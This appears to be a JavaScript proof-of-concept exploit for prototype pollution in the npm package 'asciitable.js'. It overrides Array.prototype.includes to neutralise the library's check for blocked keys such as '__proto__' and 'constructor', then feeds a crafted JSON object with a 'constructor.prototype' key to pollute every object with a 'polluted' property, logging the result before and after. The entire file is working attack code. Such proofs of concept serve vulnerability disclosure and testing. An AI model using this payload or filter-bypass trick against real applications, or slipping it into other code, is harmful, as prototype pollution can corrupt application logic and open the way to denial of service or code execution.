Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const req = require('asciitable.js');
const b = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
req({}, b);
console.log({}.polluted);